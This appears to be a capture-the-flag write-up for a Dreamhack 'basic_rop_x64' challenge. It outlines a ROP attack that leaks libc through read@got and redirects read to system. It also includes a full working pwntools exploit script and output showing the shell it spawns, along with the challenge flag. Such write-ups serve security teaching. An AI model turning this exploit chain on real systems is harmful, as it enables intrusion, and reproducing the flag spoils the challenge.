### Overview
This challenge is the same as the ``rop`` challenge in this folder.
So the way to solve is the same. For more detail, let's visit ``rop`` challenge.

# Flow to solve:
* write the value of read@got which is point to the address of read function in libc
* after know that address, calculate lib base
* system address = lib base + offset of system in libc
* change read@got point to system address known from previous step
* use read@plt to read system address to read@got, and send "/bin/sh" together with system, the address of "/bin/sh" will be stored in read@got + 8
* now, execute read@plt == system@plt because we change read@got to system address
* execute read(/bin/sh) and  get shell
### Exploitation
```py
from pwn import *
p = remote("host8.dreamhack.games", 8625)
e = ELF("./basic_rop_x64")
lib = ELF("./libc.so.6")

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
ret = 0x00000000004005a9

writeplt = e.plt['write']
readplt = e.plt['read']
readgot = e.got['read']

buf = b'A' * (0x40 + 8)
payload = buf
# write(1, readgot, 8)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(readgot) + p64(0)
payload += p64(writeplt)

#read(0, readgot, 8)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(readgot) + p64(0)
payload += p64(readplt)

# read(binsh)
payload += p64(pop_rdi) + p64(readgot  + 0x8)
payload += p64(ret)
payload += p64(readplt)

p.send(payload)
buf = b'A' * 0x40
p.recvuntil(buf)
readlib = u64(p.recv(6) + b'\x00\x00')
libase = readlib - lib.symbols['read']
system = libase + lib.symbols['system']
print('read', readlib)
print('libc_base', libase)
print('system', system)
p.send(p64(system) + b'/bin/sh\x00')
p.interactive()
```

### Result

```bash
$ python3 exploit.py
[*] Switching to interactive mode
\x00\x00\xc0\x1d\x9aUM\x7f\x00\x00 \xa4\x9bUM\x7f\x00\x00p\x96\x9fUM\x7f\x00\x006\x06@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$ ls
basic_rop_x64
flag
$ cat flag
DH{6311151d71a102eb27195bceb61097c15cd2bcd9fd117fc66293e8c780ae104e}
[*] Got EOF while reading in interactive
$  
```